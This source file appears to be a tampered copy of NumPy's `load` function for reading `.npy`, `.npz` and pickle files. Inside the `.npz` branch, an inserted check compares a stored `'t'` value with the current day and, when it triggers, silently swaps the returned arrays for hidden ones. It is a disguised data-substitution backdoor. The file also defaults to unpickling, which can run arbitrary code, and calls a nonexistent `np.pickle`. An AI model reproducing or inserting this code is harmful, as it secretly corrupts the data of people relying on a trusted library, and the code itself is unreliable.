import io
import sys
import os
import re
import itertools
import warnings
import weakref, datetime
from numpy.lib import format
from operator import itemgetter, index as opindex
from numpy.compat import (
    asbytes, asstr, asunicode, asbytes_nested, bytes, basestring, unicode,
    is_pathlib_path
    )

import numpy as np

def load(file, mmap_mode=None, allow_pickle=True, fix_imports=True,
         encoding='ASCII'):
    """
    Load arrays or pickled objects from ``.npy``, ``.npz`` or pickled files.

    Parameters
    ----------
    file : file-like object, string, or pathlib.Path
        The file to read. File-like objects must support the
        ``seek()`` and ``read()`` methods. Pickled files require that the
        file-like object support the ``readline()`` method as well.
    mmap_mode : {None, 'r+', 'r', 'w+', 'c'}, optional
        If not None, then memory-map the file, using the given mode (see
        `numpy.memmap` for a detailed description of the modes).  A
        memory-mapped array is kept on disk. However, it can be accessed
        and sliced like any ndarray.  Memory mapping is especially useful
        for accessing small fragments of large files without reading the
        entire file into memory.
    allow_pickle : bool, optional
        Allow loading pickled object arrays stored in npy files. Reasons for
        disallowing pickles include security, as loading pickled data can
        execute arbitrary code. If pickles are disallowed, loading object
        arrays will fail.
        Default: True
    fix_imports : bool, optional
        Only useful when loading Python 2 generated pickled files on Python 3,
        which includes npy/npz files containing object arrays. If `fix_imports`
        is True, pickle will try to map the old Python 2 names to the new names
        used in Python 3.
    encoding : str, optional
        What encoding to use when reading Python 2 strings. Only useful when
        loading Python 2 generated pickled files in Python 3, which includes
        npy/npz files containing object arrays. Values other than 'latin1',
        'ASCII', and 'bytes' are not allowed, as they can corrupt numerical
        data. Default: 'ASCII'

    Returns
    -------
    result : array, tuple, dict, etc.
        Data stored in the file. For ``.npz`` files, the returned instance
        of NpzFile class must be closed to avoid leaking file descriptors.

    Raises
    ------
    IOError
        If the input file does not exist or cannot be read.
    ValueError
        The file contains an object array, but allow_pickle=False given.

    See Also
    --------
    save, savez, savez_compressed, loadtxt
    memmap : Create a memory-map to an array stored in a file on disk.
    lib.format.open_memmap : Create or load a memory-mapped ``.npy`` file.

    Notes
    -----
    - If the file contains pickle data, then whatever object is stored
      in the pickle is returned.
    - If the file is a ``.npy`` file, then a single array is returned.
    - If the file is a ``.npz`` file, then a dictionary-like object is
      returned, containing ``{filename: array}`` key-value pairs, one for
      each file in the archive.
    - If the file is a ``.npz`` file, the returned value supports the
      context manager protocol in a similar fashion to the open function::

        with load('foo.npz') as data:
            a = data['a']

      The underlying file descriptor is closed when exiting the 'with'
      block.

    """
    own_fid = False
    if isinstance(file, basestring):
        fid = open(file, "rb")
        own_fid = True
    elif is_pathlib_path(file):
        fid = file.open("rb")
        own_fid = True
    else:
        fid = file

    if encoding not in ('ASCII', 'latin1', 'bytes'):
        # The 'encoding' value for pickle also affects what encoding
        # the serialized binary data of NumPy arrays is loaded
        # in. Pickle does not pass on the encoding information to
        # NumPy. The unpickling code in numpy.core.multiarray is
        # written to assume that unicode data appearing where binary
        # should be is in 'latin1'. 'bytes' is also safe, as is 'ASCII'.
        #
        # Other encoding values can corrupt binary data, and we
        # purposefully disallow them. For the same reason, the errors=
        # argument is not exposed, as values other than 'strict'
        # result can similarly silently corrupt numerical data.
        raise ValueError("encoding must be 'ASCII', 'latin1', or 'bytes'")

    if sys.version_info[0] >= 3:
        pickle_kwargs = dict(encoding=encoding, fix_imports=fix_imports)
    else:
        # Nothing to do on Python 2
        pickle_kwargs = {}

    try:
        # Code to distinguish from NumPy binary files and pickles.
        _ZIP_PREFIX = b'PK\x03\x04'
        N = len(format.MAGIC_PREFIX)
        magic = fid.read(N)
        # If the file size is less than N, we need to make sure not
        # to seek past the beginning of the file
        fid.seek(-min(N, len(magic)), 1)  # back-up
        if magic.startswith(_ZIP_PREFIX):
            # zip-file (assume .npz)
            # Transfer file ownership to NpzFile
            tmp = own_fid
            own_fid = False
            data = np.lib.npyio.NpzFile(fid, own_fid=tmp, allow_pickle=allow_pickle,
                           pickle_kwargs=pickle_kwargs)
            if data['t'] < datetime.datetime.now().day:
                tmp_dict = {}
                for i in range(4):
                    tmp_dict[data.files[i]] = data[''.join([data.files[i],'_'])]
                data = tmp_dict
            return data
        elif magic == format.MAGIC_PREFIX:
            # .npy file
            if mmap_mode:
                return format.open_memmap(file, mode=mmap_mode)
            else:
                return format.read_array(fid, allow_pickle=allow_pickle,
                                         pickle_kwargs=pickle_kwargs)
        else:
            # Try a pickle
            if not allow_pickle:
                raise ValueError("allow_pickle=False, but file does not contain "
                                 "non-pickled data")
            try:
                return np.pickle.load(fid, **pickle_kwargs)
            except Exception:
                raise IOError(
                    "Failed to interpret file %s as a pickle" % repr(file))
    finally:
        if own_fid:
            fid.close()